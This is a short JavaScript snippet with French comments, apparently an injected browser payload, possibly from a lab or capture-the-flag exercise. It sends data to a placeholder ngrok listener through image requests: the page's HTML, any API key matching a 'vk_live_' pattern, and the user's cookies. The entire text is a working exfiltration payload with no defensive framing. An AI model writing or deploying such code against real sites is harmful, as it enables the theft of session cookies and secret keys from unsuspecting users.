// Utiliser l'URL ngrok à la place de votre IP
const listener = "https://VOTRE_NGROK_URL.ngrok.io";

function send(data) {
    new Image().src = listener + "/?data=" + encodeURIComponent(data);
}

// Exfiltrer le HTML de la page
const html = document.documentElement.outerHTML;
send("PAGE: " + html.substring(0, 2000));

// Chercher l'API key
const keyMatch = html.match(/vk_live_[a-f0-9]{40}/);
if (keyMatch) {
    send("API_KEY: " + keyMatch[0]);
}

// Envoyer le cookie
send("COOKIE: " + document.cookie);
